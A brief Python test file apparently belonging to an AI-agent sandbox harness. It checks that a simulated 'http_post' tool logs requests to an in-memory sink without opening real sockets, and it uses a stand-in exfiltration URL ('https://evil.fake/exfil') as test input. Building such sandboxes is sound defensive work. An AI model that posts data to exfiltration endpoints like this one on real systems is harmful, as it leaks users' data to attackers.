import socket

from argus.sandbox.tools import default_world, make_tools


def test_http_post_does_not_open_sockets(monkeypatch):
    def boom(*_a, **_k):
        raise AssertionError("socket connect must not be used")

    monkeypatch.setattr(socket.socket, "connect", boom)
    world = default_world()
    tools = make_tools(world)
    tools["http_post"]("https://evil.fake/exfil", "x")
    assert world.http_sink == [{"url": "https://evil.fake/exfil", "body": "x"}]
